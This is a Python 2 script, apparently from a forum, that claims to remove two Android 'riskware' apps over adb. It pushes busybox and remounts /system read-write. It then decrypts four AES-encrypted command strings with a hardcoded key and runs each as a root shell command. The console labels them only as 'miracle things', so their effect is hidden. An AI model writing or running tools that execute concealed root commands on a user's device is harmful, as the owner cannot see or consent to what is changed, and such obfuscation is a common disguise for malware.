# -*- coding: utf-8 -*-

import base64
import os
import sys
from Crypto.Cipher import AES

BLOCK_SIZE=256

PADDING = '{'

pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

d_that_shit = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

key = AES.new('xxxxxxxxxxx-twiz')

def main() :


	dFirst = d_that_shit(key, "P5sW+MNGUuc2p4axzrh2Cvqs2R/F4k3ZL/z8wIyeDcc8HbmjL6UBqoZ2D21/Blmr+qyF+BS+PGOFsySv7yddD1xdGM6Uei1q7ynnEiLhaLvWEpEArLCczJtvTxr2KIBfDhQwEpbRXfd/GrI5b8jfkzTzE7XJ0n64kuQDwph7Wmpnbx++m1LG14MpftUGnno2TChHEq9fqMAlfIlmDzZfZiJtltjYSveaC/cvljaAbLKCehfxAhgQ3xx6M72u0yYqf282qpLjTlQ6uL4BcXszZgavxpsFFcaRCeW2bH6GG/cv9elJFRFJzAp2ql8QzsiBnEha5NCGgdX95whCJH0ORxEv0V0j1rj/enqkS0O94YGSPa4+/Jnl6FtkyMRlnN9iasWjhu4c3khgYCPMj/sQkUKjOPF/vm8KIls+sKIkynxPw+vW5LjbY8iVHk4YhmJBmbYHtvKukSbhikGnr5/X7DKLE/Tt0Eieez6PaBFEnRjIL6RcehX8KRK1XpJ+MHVMXF0YzpR6LWrvKecSIuFou8FRqvtsXGMo4hlgKz/h/iUJSLYzQZb1AFrxfXfgSrVw/ODWakySrEx3nGXfmTHCL0UvW18/UeAfI0Ifgg6HzW853qgK8m3Tv3KiVGb0f4ijSKNS9MNVNbUQHotzQCEjqtdcFF/xjvWYT6m/Y44Nj+2yJkTCryaSyRr0v02JKJQiNs/AWRCpaO4DWdExUMsY60UvW18/UeAfI0Ifgg6HzW9L7ucIpamS8QRxMVc6DlOMiIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgn")
	dSec = d_that_shit(key, "pvuJLPJUaOrA7JeqL0ZgdfxpNaDnf4OFxdatUNSVMjTDcd0XEWEHTZDrs3bXx0F69eFGKtwe4qmdi8FZnoAsGx9i5ThXeOl+m3vcI5SPlEYiN+0Y+m/ezFEpC8DbTX2AWJ1lL3vC6X4bD+uFocjF0W/n435QcqOD5gsClBHk87KVwC9MpZnQ2LPXpaenKh1qVWsKJ6iSQFEe5QI0pMrAKpAvs5OPOPI8z/XbMZ5h2x+NMxw4xy2iMcLU6Xa61iQxbUm3Nw3Azeray5aPWWTwZNf749pNQ5UaD2FdeFhMniKyl+ZW4yVx88cM+GdZeQFhM2isaf3Kw07BIRLhGq/6VPXhRircHuKpnYvBWZ6ALBtnRbmBeKhFbqixuKZvgo4BmVapJ0csZR29Ii78t6JB2c3QuZrQdT8FwoeiSzVdyOYf/9GAX2Y7kuhCBe/NLdtJFK0HSE9c3w2eO0Y/fjMMMBEv0V0j1rj/enqkS0O94YEmqgfSGJICk2HPK4D32m9B2saQhCsZYf+V+/w3m3+bNVxOyZSU2UGeAZmvWoEYyY8+APKdyrgXm3crgOUAsvFpOhLiOXSmemkuCG1ZxPfRzwrWJqo/Zgt8ZlEuD2MG8cH14UYq3B7iqZ2LwVmegCwb7nSFWU2sHgMFZWzXp3tByLh+r9SasCi7BcSpb6Q+Y2B41g4AlB2XOct1WClIaUy5+YTvnK2VNYXsTwTOM1alINYSkQCssJzMm29PGvYogF9kaVWZ3JCHn7RtP0ybR5o15QglGXHeyzRvi8ZEevtz5m9cQsvGDvNZTAuKR0Sa2m+PrssEyqlkU7+X7rBczwf3T2kDo2w+Kuzkgg0abdWnIh0q1abbV/DwrK72MT2m/2HQYjFqZYP7FevrUMpZS7fhgmDXREkJcsvYGuXcA+8E17ACVIyMpgzbk1FleQkXeD+QTVLOYzFA0XbvHIZk9g1WiIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgn")
	dThird = d_that_shit(key, "nG4OrOvyhBEziMM+9012L+c5rYDnQiRdRhcLkTlpHgM+CB2mdpuXYE5yxxRhO95vmwCeeP3z+7Scf8W6PcIW7j4IHaZ2m5dgTnLHFGE73m9zZfM4A5T4Xxz05oIPuydxiIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJw==")
	dFourth = d_that_shit(key, "LjoESKeNl6G6ImwkYl88Xg2PeWxjY4VM9HJTruv9dQCKVjs+X56pgjCqyuDq2IpK7vhOt5YeoL29LWWFhjRO7opWOz5fnqmCMKrK4OrYikrrlQAsoZY3MxC69P2j5C4OGhHanhIdf0dLHWIpuN9O4Cyj+FXoTq4gQR+KleSdx304y4F69NxDQONEhgGvek1U1hKRAKywnMybb08a9iiAXw4UMBKW0V33fxqyOW/I35OsoQhAXUF19/wvpCIA6RpEBYvs/oYRQzUAuHQT2U1VnRG8fW3PsFK5eCfxZg3D8i5Hqc5WXE218MnHoALkuIW32saQhCsZYf+V+/w3m3+bNVxOyZSU2UGeAZmvWoEYyY/goHL1uEPsewd6uLlCq3CPzp50Sn1feLmBt9lFKPCbVi2NvZBk0R+zqt/Vvvq1ERJHQIlk92ca+oLCKlCUs8xFrnOGsCFsqsluuaob1bK5ia81gh8V+ISH4g1JD0pCvS9Xs1aMlFvIWlKAZ5hDvnP0x/eZMG1mqhm2zPbqa4gE+qznI2tZUQ7W6wtp8KdIvaqwk3BiNBMuDphSyB2yX/YSH9mtmKwUU01jvuCRuMTNEP7aKo1KJwE5yWKVe2mbQFjd8CEgkHnixczcgZ9th80MAJtlxWOKfMmu9oGZfPOKNkSgib1kM2x0AdOcvQgf+ZTOAgd78DhoVVyaiAb+GHk1c+8wNa4SniVmlt/Hw9I6WlQy2Hfz2ghA3vsu6eoaF9yCEf4PqIJcSf7/w5W70SUvfnLNttH/qkVMEKi0Eae8uYiHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgn")

	print '###################################'
	print '###################################'
	print '# TwizzyIndy				     ##'
	print '# MonkeyTest&TimeService Remover###'
	print '###################################'
	print '###################################'
	print ''
	print 'this tiny script will remove MonkeyTest and TimeService riskwares.'
	print 'and will make protect them for device. your device will not be able to'
	print 'affected again.'
	print ''
	print 'Myanmar Online Family'
	print 'http://mof.asia/forum.php'
	print ''

	print 'Pushing busybox ...'
	os.system('adb push busybox /data/local/tmp')
	os.system("adb shell su -c 'chmod 777 /data/local/tmp/busybox'")
	os.system("adb shell su -c '/data/local/tmp/busybox mount -o remount,rw /system'")
	os.system("adb shell su -c 'dd if=/data/local/tmp/busybox of=/system/bin/busybox'")
	os.system("adb shell su -c 'chmod 644 /system/bin/busybox'")

	print 'making miracle things (1/3)'
	os.system('adb shell ' + "\"" + dFirst + "\"" )

	print 'making miracle things (2/3)'
	os.system('adb shell ' + "\"" + dSec + "\"" )

	print 'making miracle things (3/3)'
	os.system('adb shell ' + "\"" + dThird + "\"" )

	print 'protecting you from that things ...'
	os.system('adb shell ' + "\"" + dFourth + "\"" )

	print 'BINGO !!!'
	print 'ur device will gettin reboot ..'

	#os.system('adb reboot')
	print 'bye ...'
	
	sys.exit(0)

if __name__ == "__main__":
	main()

